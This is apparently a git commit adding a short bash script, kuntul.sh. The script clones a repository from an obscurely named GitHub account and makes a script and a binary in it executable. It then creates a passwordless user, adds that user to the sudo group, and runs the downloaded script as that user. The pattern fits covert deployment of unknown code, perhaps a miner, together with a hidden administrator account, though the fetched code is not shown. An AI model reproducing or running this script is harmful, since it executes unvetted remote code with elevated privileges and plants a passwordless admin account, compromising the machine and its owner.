d0e33c11cd1832f3c40627690a5b1075dc4a9abc
Tulisbajhf <86449477+Tulisbajhf@users.noreply.github.com>
2021-06-26 18:07:31 +0700

    Update and rename okeh.sh to kuntul.sh

---
+++ kuntul.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/dsfdsftretrtret43433/bubur.git && cd bubur
+chmod +x okeh.sh && chmod +x dulang
+sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
+sudo -u hoh -H sh -c "./okeh.sh"
